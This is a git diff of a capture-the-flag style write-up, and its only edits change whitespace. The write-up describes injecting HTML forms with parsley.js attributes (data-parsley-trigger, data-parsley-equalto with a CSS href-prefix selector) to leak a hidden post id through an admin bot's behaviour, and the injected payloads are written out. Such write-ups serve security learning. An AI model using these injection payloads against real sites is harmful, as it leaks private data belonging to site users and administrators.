@@ -23,8 +23,8 @@ The [parsley](https://parsleyjs.org/) package is used to validate input elements
 This is what we tried to inject:
 ```
 <form data-parsley-validate>
-	<input type="text" 
-		data-parsley-trigger="load"
+    <input type="text" 
+        data-parsley-trigger="load"
         data-parsley-required
         required
 
@@ -36,7 +36,7 @@ This is what we tried to inject:
         data-parsley-minlength="0"
         value=''
         autofocus>
-	<input type="submit">
+    <input type="submit">
 </form>
 ```
 However, `load init blur focusin focusout` and all other valid triggers failed to validate on page load. *Later we found that other teams have been sucessful with `blur`, however, for some reason, we could not.*  
@@ -59,7 +59,7 @@ So recap:
 The injected text:
 ```
 <form data-parsley-validate>
-	<input type="text" 
+    <input type="text" 
         data-parsley-trigger="focusout"
         data-parsley-equalto='a[href^="/show.php?id=GUESS"]'
 
@@ -68,7 +68,7 @@ The injected text:
 
         value='a[href^="/show.php?id=GUESS"]'
         autofocus>
-	<input type="submit">
+    <input type="submit">
 </form>
 ```
 We don't actually need the admin to like an actual post, we just need him **not to like ours** so we can use `value="0000000000000000"`.  
